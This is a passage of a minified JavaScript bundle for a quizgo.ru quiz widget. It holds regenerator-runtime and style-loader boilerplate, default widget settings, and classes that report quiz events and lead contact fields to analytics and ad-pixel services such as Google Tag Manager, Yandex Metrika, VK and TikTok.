                this.done = !0;
                var e = this.tryEntries[0].completion;
                if ("throw" === e.type) throw e.arg;
                return this.rval;
              },
              dispatchException: function (e) {
                if (this.done) throw e;
                var n = this;
                function i(i, o) {
                  return s.type = "throw", s.arg = e, n.next = i, o && (n.method = "next", n.arg = t), !!o;
                }
                for (var r = this.tryEntries.length - 1; r >= 0; --r) {
                  var a = this.tryEntries[r],
                    s = a.completion;
                  if ("root" === a.tryLoc) return i("end");
                  if (a.tryLoc <= this.prev) {
                    var c = o.call(a, "catchLoc"),
                      l = o.call(a, "finallyLoc");
                    if (c && l) {
                      if (this.prev < a.catchLoc) return i(a.catchLoc, !0);
                      if (this.prev < a.finallyLoc) return i(a.finallyLoc);
                    } else if (c) {
                      if (this.prev < a.catchLoc) return i(a.catchLoc, !0);
                    } else {
                      if (!l) throw new Error("try statement without catch or finally");
                      if (this.prev < a.finallyLoc) return i(a.finallyLoc);
                    }
                  }
                }
              },
              abrupt: function (e, t) {
                for (var n = this.tryEntries.length - 1; n >= 0; --n) {
                  var i = this.tryEntries[n];
                  if (i.tryLoc <= this.prev && o.call(i, "finallyLoc") && this.prev < i.finallyLoc) {
                    var r = i;
                    break;
                  }
                }
                r && ("break" === e || "continue" === e) && r.tryLoc <= t && t <= r.finallyLoc && (r = null);
                var a = r ? r.completion : {};
                return a.type = e, a.arg = t, r ? (this.method = "next", this.next = r.finallyLoc, g) : this.complete(a);
              },
              complete: function (e, t) {
                if ("throw" === e.type) throw e.arg;
                return "break" === e.type || "continue" === e.type ? this.next = e.arg : "return" === e.type ? (this.rval = this.arg = e.arg, this.method = "return", this.next = "end") : "normal" === e.type && t && (this.next = t), g;
              },
              finish: function (e) {
                for (var t = this.tryEntries.length - 1; t >= 0; --t) {
                  var n = this.tryEntries[t];
                  if (n.finallyLoc === e) return this.complete(n.completion, n.afterLoc), E(n), g;
                }
              },
              catch: function (e) {
                for (var t = this.tryEntries.length - 1; t >= 0; --t) {
                  var n = this.tryEntries[t];
                  if (n.tryLoc === e) {
                    var i = n.completion;
                    if ("throw" === i.type) {
                      var o = i.arg;
                      E(n);
                    }
                    return o;
                  }
                }
                throw new Error("illegal catch attempt");
              },
              delegateYield: function (e, n, i) {
                return this.delegate = {
                  iterator: T(e),
                  resultName: n,
                  nextLoc: i
                }, "next" === this.method && (this.arg = t), g;
              }
            }, e;
          }(e.exports);
        try {
          regeneratorRuntime = o;
        } catch (e) {
          "object" == typeof globalThis ? globalThis.regeneratorRuntime = o : Function("r", "regeneratorRuntime = r")(o);
        }
      },
      379: function (e) {
        "use strict";

        var t = [];
        function n(e) {
          for (var n = -1, i = 0; i < t.length; i++) if (t[i].identifier === e) {
            n = i;
            break;
          }
          return n;
        }
        function i(e, i) {
          for (var r = {}, a = [], s = 0; s < e.length; s++) {
            var c = e[s],
              l = i.base ? c[0] + i.base : c[0],
              u = r[l] || 0,
              d = "".concat(l, " ").concat(u);
            r[l] = u + 1;
            var p = n(d),
              h = {
                css: c[1],
                media: c[2],
                sourceMap: c[3],
                supports: c[4],
                layer: c[5]
              };
            if (-1 !== p) t[p].references++, t[p].updater(h);else {
              var f = o(h, i);
              i.byIndex = s, t.splice(s, 0, {
                identifier: d,
                updater: f,
                references: 1
              });
            }
            a.push(d);
          }
          return a;
        }
        function o(e, t) {
          var n = t.domAPI(t);
          return n.update(e), function (t) {
            if (t) {
              if (t.css === e.css && t.media === e.media && t.sourceMap === e.sourceMap && t.supports === e.supports && t.layer === e.layer) return;
              n.update(e = t);
            } else n.remove();
          };
        }
        e.exports = function (e, o) {
          var r = i(e = e || [], o = o || {});
          return function (e) {
            e = e || [];
            for (var a = 0; a < r.length; a++) {
              var s = n(r[a]);
              t[s].references--;
            }
            for (var c = i(e, o), l = 0; l < r.length; l++) {
              var u = n(r[l]);
              0 === t[u].references && (t[u].updater(), t.splice(u, 1));
            }
            r = c;
          };
        };
      },
      569: function (e) {
        "use strict";

        var t = {};
        e.exports = function (e, n) {
          var i = function (e) {
            if (void 0 === t[e]) {
              var n = document.querySelector(e);
              if (window.HTMLIFrameElement && n instanceof window.HTMLIFrameElement) try {
                n = n.contentDocument.head;
              } catch (e) {
                n = null;
              }
              t[e] = n;
            }
            return t[e];
          }(e);
          if (!i) throw new Error("Couldn't find a style target. This probably means that the value for the 'insert' parameter is invalid.");
          i.appendChild(n);
        };
      },
      216: function (e) {
        "use strict";

        e.exports = function (e) {
          var t = document.createElement("style");
          return e.setAttributes(t, e.attributes), e.insert(t, e.options), t;
        };
      },
      565: function (e, t, n) {
        "use strict";

        e.exports = function (e) {
          var t = n.nc;
          t && e.setAttribute("nonce", t);
        };
      },
      795: function (e) {
        "use strict";

        e.exports = function (e) {
          var t = e.insertStyleElement(e);
          return {
            update: function (n) {
              !function (e, t, n) {
                var i = "";
                n.supports && (i += "@supports (".concat(n.supports, ") {")), n.media && (i += "@media ".concat(n.media, " {"));
                var o = void 0 !== n.layer;
                o && (i += "@layer".concat(n.layer.length > 0 ? " ".concat(n.layer) : "", " {")), i += n.css, o && (i += "}"), n.media && (i += "}"), n.supports && (i += "}");
                var r = n.sourceMap;
                r && "undefined" != typeof btoa && (i += "\n/*# sourceMappingURL=data:application/json;base64,".concat(btoa(unescape(encodeURIComponent(JSON.stringify(r)))), " */")), t.styleTagTransform(i, e, t.options);
              }(t, e, n);
            },
            remove: function () {
              !function (e) {
                if (null === e.parentNode) return !1;
                e.parentNode.removeChild(e);
              }(t);
            }
          };
        };
      },
      589: function (e) {
        "use strict";

        e.exports = function (e, t) {
          if (t.styleSheet) t.styleSheet.cssText = e;else {
            for (; t.firstChild;) t.removeChild(t.firstChild);
            t.appendChild(document.createTextNode(e));
          }
        };
      },
      327: function () {}
    },
    t = {};
  function n(i) {
    var o = t[i];
    if (void 0 !== o) return o.exports;
    var r = t[i] = {
      id: i,
      exports: {}
    };
    return e[i].call(r.exports, r, r.exports, n), r.exports;
  }
  n.n = function (e) {
    var t = e && e.__esModule ? function () {
      return e.default;
    } : function () {
      return e;
    };
    return n.d(t, {
      a: t
    }), t;
  }, n.d = function (e, t) {
    for (var i in t) n.o(t, i) && !n.o(e, i) && Object.defineProperty(e, i, {
      enumerable: !0,
      get: t[i]
    });
  }, n.g = function () {
    if ("object" == typeof globalThis) return globalThis;
    try {
      return this || new Function("return this")();
    } catch (e) {
      if ("object" == typeof window) return window;
    }
  }(), n.o = function (e, t) {
    return Object.prototype.hasOwnProperty.call(e, t);
  }, n.r = function (e) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(e, "__esModule", {
      value: !0
    });
  }, n.nc = void 0;
  var i = {};
  !function () {
    "use strict";

    n.r(i), n.d(i, {
      default: function () {
        return ee;
      },
      quizgo: function () {
        return te;
      }
    }), n(666), "function" != typeof Object.assign && (Object.assign = function (e) {
      if (null == e) throw new TypeError("Cannot convert undefined or null to object");
      e = Object(e);
      for (var t = 1; t < arguments.length; t++) {
        var n = arguments[t];
        if (null != n) for (var i in n) Object.prototype.hasOwnProperty.call(n, i) && (e[i] = n[i]);
      }
      return e;
    });
    var e = {
      env: "local",
      app_url: "//panel.quizgo.ru",
      version: "1570900844w5ePN82hwnJqBLtLzx4u"
    };
    document.addEventListener("DOMContentLoaded", function () {
      document.getElementsByClassName("js-quiz-settings").length && (e.date = document.getElementsByClassName("js-quiz-settings")[0].getAttribute("data-date"));
    });
    var t = e,
      o = n(379),
      r = n.n(o),
      a = n(795),
      s = n.n(a),
      c = n(569),
      l = n.n(c),
      u = n(565),
      d = n.n(u),
      p = n(216),
      h = n.n(p),
      f = n(589),
      b = n.n(f),
      g = n(291),
      m = {};
    function v(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    m.styleTagTransform = b(), m.setAttributes = d(), m.insert = l().bind(null, "head"), m.domAPI = s(), m.insertStyleElement = h(), r()(g.Z, m), g.Z && g.Z.locals && g.Z.locals;
    var w = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.params = t, this.googleAnalitics = this.params.googleAnalitics;
      }
      var t, n;
      return t = e, (n = [{
        key: "check",
        value: function () {
          return !!this.googleAnalitics && !!this.googleAnalitics.enabled && void 0 !== window.gtag && this.googleAnalitics.id_counter;
        }
      }, {
        key: "init",
        value: function () {
          this.check() && this.goal("init");
        }
      }, {
        key: "start",
        value: function () {
          this.check() && this.goal("start");
        }
      }, {
        key: "open",
        value: function () {
          this.check() && this.goal("open");
        }
      }, {
        key: "send",
        value: function () {
          this.check() && this.goal("send");
        }
      }, {
        key: "close",
        value: function () {
          this.check() && this.goal("close");
        }
      }, {
        key: "answer",
        value: function (e) {
          this.check() && this.goal("answer_".concat(e));
        }
      }, {
        key: "goal",
        value: function (e) {
          e = "quiz_".concat(this.params.id, "_").concat(e), console.log("QuizWidget > GoogleAnalyticsService@goal", e), window.gtag("event", e);
        }
      }]) && v(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function y(e) {
      return y = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      }, y(e);
    }
    function k(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var x = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.params = t, this.tagmanager = this.params.tagmanager;
      }
      var t, n;
      return t = e, (n = [{
        key: "check",
        value: function () {
          return !!(this.tagmanager && this.tagmanager.enable && this.tagmanager.gtm_code && "object" === y(window.dataLayer));
        }
      }, {
        key: "init",
        value: function () {
          this.check() && this.goal(this.tagmanager.init_event);
        }
      }, {
        key: "start",
        value: function () {
          this.check() && this.goal(this.tagmanager.start_event);
        }
      }, {
        key: "open",
        value: function () {
          this.check() && this.goal(this.tagmanager.open_event);
        }
      }, {
        key: "send",
        value: function (e) {
          this.check() && window.dataLayer.push({
            event: this.tagmanager.send_event,
            name: e.name,
            email: e.email,
            phone: e.phone
          });
        }
      }, {
        key: "close",
        value: function () {
          this.check() && this.goal(this.tagmanager.close_event);
        }
      }, {
        key: "answer",
        value: function (e) {
          this.check() && this.goal("quiz_".concat(this.params.id, "_").concat(e));
        }
      }, {
        key: "goal",
        value: function (e) {
          return console.log("widget > GoogleTagManagerService@goal ".concat(e)), !!e && void 0 !== window.dataLayer && (window.dataLayer.push({
            event: e
          }), !0);
        }
      }]) && k(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function _(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var z = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.params = t, this.yandexMetrika = this.params.yandexMetrika;
      }
      var t, n;
      return t = e, (n = [{
        key: "check",
        value: function () {
          return console.log("YandexMetrikaService check", this.yandexMetrika), !!this.yandexMetrika.enabled && this.yandexMetrika.id_metrika;
        }
      }, {
        key: "init",
        value: function () {
          this.check() && this.goalInsert(this.yandexMetrika.init_event);
        }
      }, {
        key: "start",
        value: function () {
          this.check() && this.goalInsert(this.yandexMetrika.start_event);
        }
      }, {
        key: "open",
        value: function () {
          this.check() && this.goalInsert(this.yandexMetrika.open_event);
        }
      }, {
        key: "send",
        value: function () {
          this.check() && this.goalInsert(this.yandexMetrika.send_event);
        }
      }, {
        key: "close",
        value: function () {
          this.check() && this.goalInsert(this.yandexMetrika.close_event);
        }
      }, {
        key: "goalInsert",
        value: function (e) {
          var t = this;
          void 0 !== window.ym && window.ym(this.yandexMetrika.id_metrika, "reachGoal", e, function () {
            console.log("widget > YandexMetricaService@goalInsert", {
              target: e,
              id_metrika: t.yandexMetrika.id_metrika
            });
          });
        }
      }, {
        key: "answer",
        value: function (e) {
          return !!this.check() && (this.goalInsert("quiz_".concat(this.params.id, "_answer_").concat(e)), !0);
        }
      }]) && _(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function q(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var S = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.params = t, this.pixelVkAds = this.params.pixelVkAds;
      }
      var t, n;
      return t = e, (n = [{
        key: "check",
        value: function () {
          return !!this.pixelVkAds.enable && this.pixelVkAds.pixel_id;
        }
      }, {
        key: "init",
        value: function () {
          this.check() && this.goalInsert(this.pixelVkAds.event_init);
        }
      }, {
        key: "start",
        value: function () {
          this.check() && this.goalInsert(this.pixelVkAds.event_start);
        }
      }, {
        key: "open",
        value: function () {
          this.check() && this.goalInsert(this.pixelVkAds.event_open);
        }
      }, {
        key: "send",
        value: function () {
          this.check() && this.goalInsert(this.pixelVkAds.event_send);
        }
      }, {
        key: "close",
        value: function () {
          this.check() && this.goalInsert(this.pixelVkAds.event_close);
        }
      }, {
        key: "goalInsert",
        value: function (e) {
          (window._tmr || (window._tmr = [])).push({
            type: "reachGoal",
            id: this.pixelVkAds.pixel_id,
            goal: e
          }), console.log("widget > PixelVkAdsService@goal", {
            target: e,
            pixel_id: this.pixelVkAds.pixel_id
          });
        }
      }, {
        key: "answer",
        value: function (e) {
          return !!this.check() && (this.goalInsert("quiz_".concat(this.params.id, "_answer_").concat(e)), !0);
        }
      }]) && q(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function C(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var E = function () {
      function e(t) {
        var n = this;
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.params = t, this.roistat = this.params.roistat, this.events = [], window.onRoistatAllModulesLoaded = function () {
          n.events.forEach(function (e, t) {
            e && n[e]() && (n.events[t] = !1);
          });
        };
      }
      var t, n;
      return t = e, (n = [{
        key: "init",
        value: function () {
          this.event("init", this.roistat.init_event);
        }
      }, {
        key: "start",
        value: function () {
          this.event("start", this.roistat.start_event);
        }
      }, {
        key: "open",
        value: function () {
          this.event("open", this.roistat.open_event);
        }
      }, {
        key: "send",
        value: function () {
          this.event("send", this.roistat.send_event);
        }
      }, {
        key: "close",
        value: function () {
          this.event("close", this.roistat.close_event);
        }
      }, {
        key: "answer",
        value: function (e) {
          return !!this.check() && (this.goal("quiz_".concat(this.params.id, "_").concat(e)), !0);
        }
      }, {
        key: "event",
        value: function (e, t) {
          return this.check() ? (this.goal(t), !0) : (this.events.push(e), !1);
        }
      }, {
        key: "check",
        value: function () {
          var e, t;
          return !!this.roistat.enabled && void 0 !== (null === (e = window.roistat) || void 0 === e || null === (t = e.event) || void 0 === t ? void 0 : t.send) && this.roistat.id_roistat;
        }
      }, {
        key: "goal",
        value: function (e) {
          console.log("RoistatService@goalInsert", e), window.roistat.event.send(e);
        }
      }]) && C(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function O(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var T = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.params = t, this.tiktok = this.params.tiktok;
      }
      var t, n;
      return t = e, (n = [{
        key: "check",
        value: function () {
          return "on" === this.tiktok.enable && this.tiktok.code;
        }
      }, {
        key: "init",
        value: function () {
          this.check() && this.goal("ViewForm");
        }
      }, {
        key: "start",
        value: function () {
          this.check() && this.goal("ClickForm");
        }
      }, {
        key: "open",
        value: function () {
          this.check() && this.goal("ClickForm");
        }
      }, {
        key: "send",
        value: function () {
          this.check() && this.goal("SubmitForm");
        }
      }, {
        key: "close",
        value: function () {
          this.check() && this.goal("ClickForm");
        }
      }, {
        key: "answer",
        value: function () {
          this.check() && this.goal("ClickForm");
        }
      }, {
        key: "goal",
        value: function (e) {
          void 0 !== window.ttq && window.ttq.track(e);
        }
      }]) && O(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function M(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var L = function () {
        function e(t) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, e), this.params = t, this.vkPixel = this.params.vkPixel;
        }
        var t, n;
        return t = e, (n = [{
          key: "check",
          value: function () {
            return !!this.vkPixel.enabled && this.vkPixel.id_pixel;
          }
        }, {
          key: "start",
          value: function () {
            this.check() && this.goal(this.vkPixel.event_start);
          }
        }, {
          key: "open",
          value: function () {
            this.check() && this.goal(this.vkPixel.event_open);
          }
        }, {
          key: "send",
          value: function () {
            this.check() && this.goal(this.vkPixel.event_lead);
          }
        }, {
          key: "answer",
          value: function (e) {
            this.check() && this.goal("Quiz".concat(this.params.id, "Answer").concat(e));
          }
        }, {
          key: "goal",
          value: function (e) {
            e && void 0 !== window.VK && (window.VK.Retargeting.Event(e), window.VK.Goal(e));
          }
        }]) && M(t.prototype, n), Object.defineProperty(t, "prototype", {
          writable: !1
        }), e;
      }(),
      A = function (e) {
        var t = document.cookie.match(new RegExp("(?:^|; )".concat(e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1"), "=([^;]*)")));
        return t ? decodeURIComponent(t[1]) : void 0;
      };
    function j(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var I = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.widget = t;
      }
      var t, n;
      return t = e, (n = [{
        key: "setTimestampInWidget",
        value: function () {
          var e = A(this.getCookieKey());
          e && this.widget.frameMessage({
            quiz_id: this.widget.id,
            action: "vuex",
            dispatch: "formData/setTimestampNewLead",
            timestamp: e
          });
        }
      }, {
        key: "rememberTimestamp",
        value: function () {
          console.log("rememberTimestamp", this.getCookieKey(), this.getTimestamp()), function (e, t, n) {
            var i = (n = n || {}).expires;
            if ("number" == typeof i && i) {
              var o = new Date();
              o.setTime(o.getTime() + 1e3 * i), i = n.expires = o;
            }
            i && i.toUTCString && (n.expires = i.toUTCString()), t = encodeURIComponent(t);
            var r = "".concat(e, "=").concat(t);
            for (var a in n) {
              r += "; ".concat(a);
              var s = n[a];
              !0 !== s && (r += "=".concat(s));
            }
            document.cookie = r;
          }(this.getCookieKey(), this.getTimestamp(), {
            expires: 31536e3
          });
        }
      }, {
        key: "getCookieKey",
        value: function () {
          return "quiz_".concat(this.widget.params.id, "_new_lead_timestamp");
        }
      }, {
        key: "getTimestamp",
        value: function () {
          return Math.floor(new Date().getTime() / 1e3);
        }
      }]) && j(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function P(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var N = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), this.widget = t, this.params = this.widget.params, this.RoistatService = new E(this.params), this.VKPixelService = new L(this.params), this.TiktokPixelService = new T(this.params), this.PixelVkAdsService = new S(this.params), this.YandexMetrikaService = new z(this.params), this.GoogleAnalyticsService = new w(this.params), this.GoogleTagManagerService = new x(this.params), this.DuplicationLeads = new I(this.widget);
      }
      var t, n;
      return t = e, (n = [{
        key: "listen",
        value: function () {
          var e = this;
          try {
            window.addEventListener("message", function (t) {
              try {
                var n = JSON.parse(t.data);
                "quiz-widget-event" === n.action && n.quizId === e.params.id ? "start" === n.event ? e.eventStart() : "answer" === n.event ? e.eventAnswer(n.data.questionIndex) : "send" === n.event && e.eventSend(n.data) : "quiz-widget-redirect-messenger" === n.action ? window.location.href = n.url : "quiz-interactive" === n.action && e.eventQuizLoaded(n);
              } catch (e) {}
            });
          } catch (e) {}
          return this;
        }
      }, {
        key: "eventQuizLoaded",
        value: function (e) {
          if (e.id) {
            var t = ".b-quizgo-wrapper__".concat(e.id, " .b-quiz-start");
            (t = document.querySelectorAll(t)).length && t.forEach(function (e) {
              e.style.display = "none";
            });
          }
        }
      }, {
        key: "eventOpen",
        value: function () {
          this.PixelVkAdsService.open(), this.VKPixelService.open(), this.TiktokPixelService.open(), this.YandexMetrikaService.open(), this.GoogleAnalyticsService.open(), this.GoogleTagManagerService.open(), this.RoistatService.open();
        }
      }, {
        key: "eventInit",
        value: function () {
          this.PixelVkAdsService.init(), this.TiktokPixelService.init(), this.YandexMetrikaService.init(), this.GoogleAnalyticsService.init(), this.GoogleTagManagerService.init(), this.RoistatService.init();
        }
      }, {
        key: "eventStart",
        value: function () {
          this.PixelVkAdsService.start(), this.VKPixelService.start(), this.TiktokPixelService.start(), this.YandexMetrikaService.start(), this.GoogleAnalyticsService.start(), this.GoogleTagManagerService.start(), this.RoistatService.start();
        }
      }, {
        key: "eventSend",
        value: function (e) {
          this.PixelVkAdsService.send(), this.VKPixelService.send(), this.TiktokPixelService.send(), this.YandexMetrikaService.send(), this.GoogleAnalyticsService.send(), this.GoogleTagManagerService.send(e), this.RoistatService.send(), this.DuplicationLeads.rememberTimestamp();
        }
      }, {
        key: "eventClose",
        value: function () {
          this.PixelVkAdsService.close(), this.TiktokPixelService.close(), this.YandexMetrikaService.close(), this.GoogleAnalyticsService.close(), this.GoogleTagManagerService.close(), this.RoistatService.close();
        }
      }, {
        key: "eventAnswer",
        value: function (e) {
          this.PixelVkAdsService.answer(e), this.TiktokPixelService.answer(), this.VKPixelService.answer(e), this.YandexMetrikaService.answer(e), this.GoogleAnalyticsService.answer(e), this.GoogleTagManagerService.answer(e), this.RoistatService.answer(e);
        }
      }]) && P(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function Q(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var B = function () {
      function e() {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e);
      }
      var t, n;
      return t = e, (n = [{
        key: "getParams",
        value: function (e) {
          return Object.assign(this.defaultParams(), e);
        }
      }, {
        key: "defaultParams",
        value: function () {
          return {
            id: 0,
            openSelector: "",
            autoOpenDelay: 0,
            autoOpen: !1,
            innerBlock: !1,
            openBeforeClose: !1,
            setupDomain: !1,
            mirrorQuiz: !1,
            domainQuiz: !1,
            openMobile: "new",
            autoOpenTimeCookie: 0,
            autoOpenNameCookie: "",
            openBeforeCloseTimeCookie: 0,
            openBeforeCloseNameCookie: "",
            saleEnable: "true",
            bonusEnable: 1,
            openByBanner: {
              color: "#ffffff",
              background: "#E57C00",
              title: "",
              text: "",
              delay: 0,
              type: "side",
              position: "top-left",
              radius: !0,
              shadow: !0,
              glare: !0,
              pulse: !0,
              hideMobile: !1,
              enable: !1
            },
            setupBlock: {
              hideOnMobile: !1,
              buttonOnMobile: !1,
              button: {
                radius: 0,
                shadow: !0,
                text: "",
                textColor: "#ffffff",
                backgroundColor: "#066CFF"
              }
            },
            yandexMetrika: {
              id: 0,
              quiz_id: 0,
              enabled: 0,
              id_metrika: null,
              init_event: "",
              open_event: "",
              close_event: "",
              start_event: "",
              send_event: ""
            },
            googleAnalitics: {
              id: 0,
              quiz_id: 0,
              enabled: 0,
              id_counter: null
            },
            tagmanager: {
              id: 0,
              quiz_id: 0,
              gtm_code: "",
              enable: 0,
              init_event: "",
              open_event: "",
              close_event: "",
              start_event: "",
              send_event: ""
            },
            tiktok: {
              id: 0,
              quiz_id: 0,
              enable: "off",
              code: null,
              init_event: "",
              open_event: "",
              close_event: "",
              start_event: "",
              send_event: ""
            },
            vkPixel: {
              id: 0,
              quiz_id: 0,
              enabled: 0,
              id_pixel: null,
              event_load: "",
              event_open: "",
              event_start: "",
              event_lead: ""
            },
            roistat: {
              id: 0,
              quiz_id: 0,
              enabled: 0,
              id_roistat: "",
              init_event: "",
              start_event: "",
              open_event: "",
              send_event: "",
              close_event: ""
            },
            pixelVkAds: {
              id: 0,
              quiz_id: 0,
              enable: 0,
              pixel_id: "",
              event_init: "",
              event_open: "",
              event_start: "",
              event_send: "",
              event_close: ""
            },
            calltouch: {
              id: 0,
              quiz_id: 0,
              enable: "off",
              site_id: "",
              code: ""
            }
          };
        }
      }]) && Q(t.prototype, n), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
    function W(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    var V = function () {
        function e(t) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, e), this.widget = t;
        }
        var t, n;
        return t = e, (n = [{
          key: "handle",
          value: function () {
            var e = this;
            this.widget.isMobile() && window.addEventListener("message", function (t) {
              try {
                var n = t.origin.replace("http://", "").replace("https://", "");
                if (e.widget.widgetIframeUrl.indexOf(n) + 1 || t.origin.indexOf("quizgo.") + 1) {
                  var i = JSON.parse(t.data);
                  if ("setHeight" === i.action && i.quiz === e.widget.params.id) {
                    var o = document.querySelector(".b-quizgo-wrapper__".concat(e.widget.params.id, ".block-id-").concat(i.blockID));
                    o && (o.style.height = "".concat(i.height, "px"), o.scrollIntoView({
                      behavior: "smooth",
                      block: "start"
                    }));
                  }
                }
              } catch (t) {}
            });
          }
        }]) && W(t.prototype, n), Object.defineProperty(t, "prototype", {
          writable: !1
        }), e;
      }(),
      D = function (e) {
        var t;
        if (void 0 !== (null === (t = window.roistat) || void 0 === t ? void 0 : t.getVisit)) {
          var n = {
            action: "vuex",
            dispatch: "analytics/roistat/setRoistatVisit",
            visit: window.roistat.getVisit()
          };
          e.contentWindow.postMessage(JSON.stringify(n), "*");
        }
      };
    var G = {
        getJivoDiv: function () {
          var e = document.getElementsByTagName("jdiv");
          return !!e.length && (e = Array.prototype.slice.call(e)).find(function (e) {
            return !e.classList.length;
          });
        },
        hide: function () {
          var e = this;
          clearInterval(this.showJivoSiteTimer), this.hideJivoSiteTimer = setInterval(function () {
            var t = e.getJivoDiv();
            t && (t.style.display = "none", clearInterval(e.hideJivoSiteTimer));
          }, 1e3);
        },
        show: function () {
          var e = this;
          clearInterval(this.hideJivoSiteTimer), this.showJivoSiteTimer = setInterval(function () {
            var t = e.getJivoDiv();
            t && (t.style.display = null, clearInterval(e.showJivoSiteTimer));
          }, 1e3);
        }
      },
      F = {
        getVerbox: function () {
          return "function" == typeof Verbox;
        },
        hide: function () {
          this.getVerbox() && Verbox("hideTrigger");
        },
        show: function () {
          this.getVerbox() && Verbox("showTrigger");
        }
      },
      R = function (e) {
        try {
          e.mobileAndTabletCheck() && (G.hide(), F.hide());
        } catch (e) {
          console.error("error Support Chats", e);
        }
      },
      U = n(301);
    function Y() {
      Y = function () {
        return e;
      };
      var e = {},
        t = Object.prototype,
        n = t.hasOwnProperty,
        i = "function" == typeof Symbol ? Symbol : {},
        o = i.iterator || "@@iterator",
        r = i.asyncIterator || "@@asyncIterator",
        a = i.toStringTag || "@@toStringTag";
      function s(e, t, n) {
        return Object.defineProperty(e, t, {
          value: n,
          enumerable: !0,
          configurable: !0,
          writable: !0
        }), e[t];
      }
      try {
        s({}, "");
      } catch (e) {
        s = function (e, t, n) {
          return e[t] = n;
        };
      }
      function c(e, t, n, i) {
        var o = t && t.prototype instanceof d ? t : d,
          r = Object.create(o.prototype),
          a = new _(i || []);
        return r._invoke = function (e, t, n) {
          var i = "suspendedStart";
          return function (o, r) {
            if ("executing" === i) throw new Error("Generator is already running");
            if ("completed" === i) {
              if ("throw" === o) throw r;
              return {
                value: void 0,
                done: !0
              };
            }
            for (n.method = o, n.arg = r;;) {
              var a = n.delegate;
              if (a) {
                var s = y(a, n);
                if (s) {
                  if (s === u) continue;
                  return s;
                }
              }
              if ("next" === n.method) n.sent = n._sent = n.arg;else if ("throw" === n.method) {
                if ("suspendedStart" === i) throw i = "completed", n.arg;
                n.dispatchException(n.arg);
              } else "return" === n.method && n.abrupt("return", n.arg);
              i = "executing";
              var c = l(e, t, n);
              if ("normal" === c.type) {
                if (i = n.done ? "completed" : "suspendedYield", c.arg === u) continue;
                return {
                  value: c.arg,
                  done: n.done
                };
              }
              "throw" === c.type && (i = "completed", n.method = "throw", n.arg = c.arg);
            }
          };
